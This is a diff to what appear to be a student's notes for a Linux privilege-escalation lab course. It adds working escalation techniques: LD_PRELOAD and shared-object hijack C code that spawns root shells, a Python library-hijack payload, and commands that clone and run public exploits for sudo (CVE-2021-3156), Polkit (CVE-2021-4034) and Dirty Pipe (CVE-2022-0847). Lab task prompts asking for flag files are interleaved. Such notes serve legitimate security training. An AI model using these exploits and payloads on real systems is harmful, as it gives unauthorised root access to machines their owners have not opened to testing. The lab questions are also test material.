@@ -1284,4 +1284,249 @@ tmux -S /shareds
 # Use the mount command
 ```
 
-####
+#### Kernel Exploits
+
+```bash
+uname -a
+cat /etc/lsb-release
+gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
+./kernel_exploit
+whoami
+```
+
+```bash
+# Escalate privileges using a different Kernel exploit. Submit the contents of the flag.txt file in the /root/kernel_exploit directory.
+# CVE-2021-3493
+```
+
+#### Shared Libraries
+
+```bash
+ldd /bin/ls
+sudo -l
+```
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+
+```bash
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+```
+
+```bash
+# Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory. 
+```
+
+#### Shared Object Hijacking
+
+```bash
+ls -la payroll
+ldd payroll
+readelf -d payroll  | grep PATH
+ls -la /development/
+ldd payroll
+cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
+./payroll 
+```
+
+```c
+#include<stdio.h>
+#include<stdlib.h>
+
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+} 
+```
+
+```bash
+gcc src.c -fPIC -shared -o /development/libshared.so
+./payroll 
+```
+
+```bash
+# Follow the examples in this section to escalate privileges, recreate all examples (don't just run the payroll binary). Practice using ldd and readelf. Submit the version of glibc (i.e. 2.30) in use to move on to the next section. 
+```
+
+#### Python Library Hijacking
+
+```python
+#!/usr/bin/env python3
+
+# Method 1
+import pandas
+
+# Method 2
+from pandas import *
+
+# Method 3
+from pandas import Series
+```
+
+```bash
+ls -l mem_status.py
+```
+
+```python
+#!/usr/bin/env python3
+import psutil
+
+available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
+
+print(f"Available memory: {round(available_memory, 2)}%")
+```
+
+```bash
+grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
+ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
+```
+
+```python
+...SNIP...
+
+def virtual_memory():
+
+	...SNIP...
+	
+    global _TOTAL_PHYMEM
+    ret = _psplatform.virtual_memory()
+    # cached for later use in Process.memory_percent()
+    _TOTAL_PHYMEM = ret.total
+    return ret
+
+...SNIP...
+```
+
+```python
+...SNIP...
+
+def virtual_memory():
+
+	...SNIP...
+	#### Hijacking
+	import os
+	os.system('id')
+	
+
+    global _TOTAL_PHYMEM
+    ret = _psplatform.virtual_memory()
+    # cached for later use in Process.memory_percent()
+    _TOTAL_PHYMEM = ret.total
+    return ret
+
+...SNIP...
+
+```
+
+```bash
+sudo /usr/bin/python3 ./mem_status.py
+python3 -c 'import sys; print("\n".join(sys.path))'
+pip3 show psutil
+ls -la /usr/lib/python3.8
+```
+
+```python
+#!/usr/bin/env python3
+
+import os
+
+def virtual_memory():
+    os.system('id')
+
+```
+
+```bash
+sudo /usr/bin/python3 mem_status.py
+sudo -l
+sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
+```
+
+```bash
+# Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer. 
+```
+
+
+#### Sudo
+
+```bash
+sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
+sudo -V | head -n1
+git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156
+make
+./sudo-hax-me-a-sandwich
+cat /etc/lsb-release
+./sudo-hax-me-a-sandwich 1
+sudo -l
+cat /etc/passwd | grep cry0l1t3
+sudo -u#-1 id
+```
+
+```bash
+# Escalate the privileges and submit the contents of flag.txt as the answer. 
+```
+
+#### Polkit
+
+```bash
+# pkexec -u <user> <command>
+pkexec -u root id
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+cd CVE-2021-4034
+gcc cve-2021-4034-poc.c -o poc
+./poc
+```
+
+```bash
+# Escalate the privileges and submit the contents of flag.txt as the answer. 
+```
+
+#### Dirty Pipe
+
+```bash
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cd CVE-2022-0847-DirtyPipe-Exploits
+bash compile.sh
+uname -r
+./exploit-1
+find / -perm -4000 2>/dev/null
+./exploit-2 /usr/bin/sudo
+```
+
+```bash
+# Escalate the privileges and submit the contents of flag.txt as the answer. 
+```
+
+### Linux Local Privelege Escalation - Skills Assessment
+
+```bash
+
+```
+
+```bash
+# Submit the contents of flag1.txt
+# Perform thorough enumeration of the file system as this user.
+
+# Submit the contents of flag2.txt
+# Users are often the weakest link...
+
+# Submit the contents of flag3.txt
+
+# Submit the contents of flag4.txt
+# Look at all external services running on the box.
+
+# Submit the contents of flag5.txt
+
+```
